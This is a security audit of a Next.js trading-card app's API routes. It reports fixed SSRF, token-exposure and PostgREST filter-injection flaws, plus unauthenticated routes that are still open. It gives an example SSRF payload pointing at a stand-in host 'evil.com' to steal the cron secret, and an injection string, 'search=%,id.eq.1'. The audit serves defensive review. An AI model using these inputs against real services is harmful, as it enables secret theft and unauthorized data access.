# Security Audit - toreca-app (2026-03-09)

## Scope
92 API routes under `app/api/`, all middleware/config, environment variable handling.

## CRITICAL - Fixed

### 1. admin/cron SSRF + Unauthorized Cron Trigger
- **File**: `app/api/admin/cron/route.ts`
- **Issue**: POST accepted arbitrary `path` parameter and fetched it with CRON_SECRET header.
  An attacker could send `{ path: "https://evil.com/steal" }` and the server would forward
  the CRON_SECRET as Authorization header to the external server.
- **Fix**: Added `/api/cron/` prefix restriction + path traversal prevention (`..`, `//`).

### 2. twitter route - X API Bearer Token Exposure
- **File**: `app/api/twitter/route.ts`
- **Issue**: No auth. Anyone could call `/api/twitter?username=xxx` to use the app's X API Bearer Token,
  exhausting rate limits or scraping arbitrary user data.
- **Fix**: Added CRON_SECRET Bearer auth (only twitter/monitor calls this internally).
- **File**: `app/api/twitter/monitor/route.ts` - Added Authorization header to internal call.

### 3. pokemon-card-scrape SSRF
- **File**: `app/api/pokemon-card-scrape/route.ts`
- **Issue**: GET/POST accepted arbitrary URLs and launched Playwright browser to scrape them.
  Attacker could scrape internal services, cloud metadata endpoints, etc.
- **Fix**: Added URL allowlist (`pokemon-card.com` only) for both GET and POST.

### 4. gemini/classify SSRF + API Cost Attack
- **File**: `app/api/gemini/classify/route.ts`
- **Issue**: POST fetched arbitrary `imageUrl` (SSRF) and sent it to Gemini API (cost attack).
- **Fix**: Added image URL domain allowlist (`pbs.twimg.com` only).

### 5. Module-scope createServiceClient() (10 routes)
- **Files**: snkrdunk-scrape, snkrdunk-chart, linking/snkrdunk/link, linking/snkrdunk/items,
  linking/snkrdunk/set-codes, linking/shinsoku/link, linking/shinsoku/items,
  linking/lounge/link, linking/lounge/items, linking/auto-match
- **Issue**: Service role client created at module import time. On Vercel, this can cause
  stale connections, and the service role key is read before env vars are fully available.
- **Fix**: Moved createServiceClient() inside each handler function.

### 6. ilike Pattern Injection (7+ routes)
- **Files**: linking/snkrdunk/items, linking/shinsoku/items, linking/lounge/items,
  chart/search, pos/catalog, pos/catalog/search-api, public/cards, lib/utils/kana.ts
- **Issue**: User search input passed directly into `.ilike()` / `.or()` without escaping
  `%`, `_`, `\`, `,`, `()`. In `.or()` string templates, `,` could inject additional
  PostgREST filter conditions (e.g., `search=%,id.eq.1`).
- **Fix**: Added `str.replace(/[%_\\,()]/g, '\\$&')` escaping in all affected routes
  and in `buildKanaSearchFilter()`.

## HIGH - Reported Only

### 7. No User Authentication System
- **Impact**: All 92 API routes are accessible to anyone who knows the URL.
- The app has no user login, no session management, no middleware auth.
- Cron routes have CRON_SECRET, but all other routes (cards CRUD, POS, linking, upload) are open.
- **Recommendation**: Add at minimum a simple auth middleware for admin routes, or use
  Supabase Auth with RLS for data-level security.

### 8. No Rate Limiting
- Only `justtcg/register` has basic IP-based rate limiting (500ms per IP).
- All other routes have no rate limiting. Particularly risky:
  - `/api/gemini/classify` - Gemini API costs
  - `/api/pricecharting-import` - AI image processing
  - `/api/snkrdunk-scrape` - External API calls
  - `/api/upload` - Storage consumption
- **Recommendation**: Add Vercel middleware or use `next-rate-limit`.

### 9. POS Routes Use Anon Key
- **Files**: pos/catalog/[id], pos/checkout/items/[id]/sell, pos/transactions/purchase, etc.
- These routes create their own `createClient()` with anon key instead of using
  `createServiceClient()`. Security depends entirely on Supabase RLS policies.
- If RLS is misconfigured for pos_* tables, data could be read/written by anyone.

### 10. Error Message Information Leakage
- Most routes return `error.message` directly to the client.
- Supabase errors can contain table names, column names, constraint names.
- **Recommendation**: Return generic error messages to clients; log details server-side.

## MEDIUM - Reported Only

### 11. upload route - Unrestricted File Upload
- **File**: `app/api/upload/route.ts`
- No auth, no file size limit (beyond default body parser limit), no file type validation.
- Base64 `image` field could contain any data type despite the regex.
- Uses upsert:true which could overwrite existing files.

### 12. cards/batch-update - No Auth
- **File**: `app/api/cards/batch-update/route.ts`
- Allows updating up to 500 cards at once with no authentication.
- Uses anon key (supabase import), so RLS-dependent.

### 13. justtcg/backfill-metadata - No Auth, Service Role
- **File**: `app/api/justtcg/backfill-metadata/route.ts`
- POST with no auth, uses createServiceClient() (bypasses RLS).
- Modifies cards table (set_code, expansion, rarity_id).

### 14. pricecharting-import - No Auth, External Fetch
- **File**: `app/api/pricecharting-import/route.ts`
- Fetches arbitrary pricecharting.com URLs and calls Gemini AI.
- No auth, 40 URLs per request, CONCURRENCY=3.
- At least URLs are validated by the fetch (pricecharting.com only by convention, not enforced).

### 15. No CORS Configuration
- `next.config.ts` is empty. No CORS headers set.
- `/api/image-proxy` explicitly sets `Access-Control-Allow-Origin: *`.
- Other routes rely on Next.js same-origin default.

### 16. CronDashboard runJob Auth Mismatch
- **File**: `components/CronDashboard.tsx` L213-232
- `runJob()` calls cron routes directly without Authorization header.
- Cron routes require Bearer CRON_SECRET. So the "run" button in the UI returns 401.
- This is a functionality bug (the button doesn't work), not a security issue.

## LOW - Noted

### 17. shinsoku/search, toreca-lounge/search, price-index, public/market-index
- ilike without escaping (same pattern as #6 but lower-traffic routes).
- Primarily internal use.

### 18. linking/auto-match .or() injection
- `parsed.cardName` from external data used in `.or()` template without escaping.
- Risk is lower since cardName comes from parsed item data, not direct user input.

### 19. snkrdunk-scrape module-scope import ordering
- The original code had `const supabase = createServiceClient()` between import statements.
- Fixed by moving to function scope.
